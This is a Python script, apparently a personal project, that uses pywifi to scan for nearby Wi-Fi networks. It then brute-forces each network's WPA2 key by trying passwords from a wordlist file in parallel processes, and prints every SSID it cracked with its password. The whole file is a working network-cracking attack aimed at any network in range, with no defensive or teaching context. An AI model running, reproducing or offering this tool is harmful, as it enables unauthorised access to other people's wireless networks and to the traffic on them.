import time
import pywifi
from pywifi import const
import multiprocessing

available_devices = []
keys = []
final_output = {}

# Get Wi-Fi interface information
wifi = pywifi.PyWiFi()
interface = wifi.interfaces()[0]

# Scan for available networks
interface.scan()
time.sleep(5) 

# Obtain scan results
scan_results = interface.scan_results()

# Extract SSIDs of available networks
for result in scan_results:
    available_devices.append(result.ssid)

# Function to crack passwords
def crack_passwords(networks, passwords):
    final_output = {}
    for network in networks:
        for password in passwords:
            profile = pywifi.Profile()
            profile.ssid = network
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.remove_all_network_profiles()
            profile = iface.add_network_profile(profile)

            iface.connect(profile)
            time.sleep(4)
            if iface.status() == const.IFACE_CONNECTED:
                final_output[network] = password
                break
    return final_output

# Read potential passwords from file
with open('Personal pj/top400.txt', 'r') as f:
    for line in f:
        keys.append(line.strip())

# Divide the list of passwords into chunks for parallel processing
chunk_size = len(keys) // multiprocessing.cpu_count()
password_chunks = [keys[i:i+chunk_size] for i in range(0, len(keys), chunk_size)]

# Create a process pool
pool = multiprocessing.Pool(processes=multiprocessing.cpu_count())

# Perform password cracking in parallel
results = []
for password_chunk in password_chunks:
    results.append(pool.apply_async(crack_passwords, args=(available_devices, password_chunk)))

# Collect results from the processes
for result in results:
    final_output.update(result.get())

# Close the pool
pool.close()
pool.join()

# Print the discovered passwords
print('*'*10, 'Discovered Passwords', '*'*10)
print("{0:<12} {1:<}".format("HOST NAME", "PASSWORD"))
for ssid, password in final_output.items():
    print("{:<12} {:<}".format(ssid, password))
